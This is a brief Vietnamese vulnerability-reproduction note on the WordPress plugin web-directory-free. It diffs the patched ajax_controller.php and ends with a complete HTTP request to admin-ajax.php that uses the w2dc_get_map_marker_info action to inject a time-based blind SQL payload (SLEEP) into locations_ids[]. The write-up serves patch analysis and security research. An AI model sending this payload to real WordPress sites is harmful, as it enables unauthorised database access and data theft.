

Merge 2 version mới và cũ

thấy ở
web-directory-free\classes\ajax_controller.php

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/1a5a3c7d-fbe8-41fb-a66b-b80c4e21fbde)

version cũ được thêm vào 1 số filter vào câu truy vấn database, có thể là ở đây có lỗi sql và được vá

Kiểm tra

đây là file ajax_controller.php nên sẽ requests tới wp-admin/admin-ajax.php

hàm get_map_marker_info được add function ở trên là 

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/a14ff344-35cf-495d-9a73-2f78f6cf5570)

```
w2dc_get_map_marker_info
```

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/2565b7c5-f088-4254-aeee-6da6c648c8a6)

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost:8088
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 82

action=w2dc_get_map_marker_info&locations_ids[]=(SELECT(0)FROM(SELECT(SLEEP(6)))a)
```
